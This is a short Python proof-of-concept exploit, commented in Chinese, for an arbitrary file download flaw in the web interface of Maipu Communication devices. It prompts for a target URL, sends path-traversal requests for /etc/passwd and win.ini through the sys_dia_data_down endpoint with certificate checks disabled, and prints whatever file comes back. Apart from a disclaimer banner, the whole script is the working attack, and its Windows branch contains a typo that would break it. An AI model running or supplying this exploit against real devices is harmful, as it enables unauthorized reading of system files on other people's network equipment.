import requests
import urllib3
import ssl
import re
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning     #https中SSL问题

def title():
    print('+------------------------------------------')
    print('+  搜索方式: ')
    print('+  Title:迈普通信技术股份有限公司 ')
    print('+  漏洞点: ')
    print('+  file_name可以任意文件下载 ')
    print('+  使用格式:')
    print('+  python3 poc.py')
    print('+  Url >>> http://xxx.xxx.xxx.xxx ')
    print('+  请勿使用在非法用途，概不负责 ')
    print('+------------------------------------------')

def POC_1(target_url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.70",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    vul_url_1 = target_url + "/webui/?g=sys_dia_data_down&file_name=../etc/passwd"
    vul_url_2 = target_url + "/webui/?g=sys_dia_data_down&file_name=C:\windows\win.ini"
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  #去掉SSL的报错
    try:
        response = requests.get(url=vul_url_1, headers=headers, verify=False, timeout=6)
        print("[-] 正在请求Linux系统文件 {} ".format(vul_url_1))
        if response.status_code == 200 and '::' in response.text:
            print("\033[36m[o] 获取file : \n{} \033[0m".format(response.text))
        elif requests.get(url=vul_url_2, headers=headers, verify=False, timeout=6).status_codes ==200:
                response = requests.get(url=vul_url_2, headers=headers, verify=False, timeout=6)
                print("[-] 正在请求Windows系统文件 {} ".format(vul_url_2))
                print("\033[36m[o] 获取file : \n{} \033[0m".format(response.text))
        else:
            print("\033[31m[x] 请求失败 \033[0m")
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__=='__main__':
    title()
    target_url = str(input("\033[0mPlease input url\nUrl >>> \033[0m"))
    target_url = target_url.rstrip('/')     #去掉右边左右/
    #print(target_url)
    POC_1(target_url)